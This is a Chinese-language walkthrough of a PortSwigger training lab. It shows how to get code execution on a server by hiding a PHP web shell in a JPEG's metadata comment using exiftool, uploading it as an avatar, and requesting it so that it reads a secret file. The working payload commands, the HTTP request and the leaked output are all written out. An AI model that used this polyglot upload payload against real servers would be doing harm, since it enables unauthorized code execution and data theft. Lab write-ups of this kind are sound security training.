# 实验：通过多语言 Web Shell 上传实现远程代码执行

https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-polyglot-web-shell-upload

本实验包含一个易受攻击的图片上传功能。虽然它会检查文件内容以验证其是否为真实图片，但仍然可以上传并执行服务器端代码。

为了解决本实验，请上传一个基本的 PHP Web Shell，然后利用它窃取 `/home/carlos/secret` 文件的内容。使用实验室横幅中提供的按钮提交此秘密信息。

你可以使用以下凭据登录自己的账户：`wiener:peter`

## 步骤

探测
- 直接构造 php 载荷到 jpg 元数据中的评论字段

    ```bash
    exiftool fruit.jpg -o payload_img.php -comment='<?php echo  file_get_contents('/home/carlos/secret'); ?>'
    ```
- 上传载荷文件为头像
- 访问账户页面，自动请求头像
    ```http
    GET /files/avatars/x.php.jpg HTTP/2
    ```
    - 服务器响应 500 异常
- 此处命令行使用了两组单引号 `'` ，打开图片载荷查看
    `<?php echo  file_get_contents(/home/carlos/secret); ?>`
    - 错误或在于文件函数中的参数非字符串且无法被解析

更新命令为外层双引号
- 命令行参数，额外添加开头结尾标记字符以区分出提取数据
    ```bash
    rm payload_img.php
    exiftool fruit.jpg -o payload_img.php -comment="<?php echo  'AAA' . file_get_contents('/home/carlos/secret') . 'ZZZ'; ?>"
    ```
- 访问头像端点
    ```http
    GET /files/avatars/x.php.jpg HTTP/2
    ```
- 服务器响应
    `AAA8eCfetnh2u2RIEywrNmooXK1DPnSK4Q6ZZZ`
    - 代码成功提取数据
